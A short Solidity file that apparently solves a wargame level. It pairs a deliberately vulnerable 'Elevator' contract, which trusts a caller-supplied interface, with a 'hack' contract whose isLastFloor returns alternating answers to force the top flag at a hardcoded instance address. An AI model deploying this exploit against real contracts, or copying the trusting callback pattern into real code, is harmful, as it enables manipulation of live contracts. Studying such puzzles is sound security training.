// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract hack {
    address instance_address = 0xfeAd619d1eeA30ad8f052dA64EdfCA4F4969e967;
    Elevator a = Elevator(instance_address);
    bool public b = true;
    function isLastFloor(uint) public returns (bool){
        b = !b;
        return b;
    }
    function exploit() public{
        a.goTo(1);
    }
}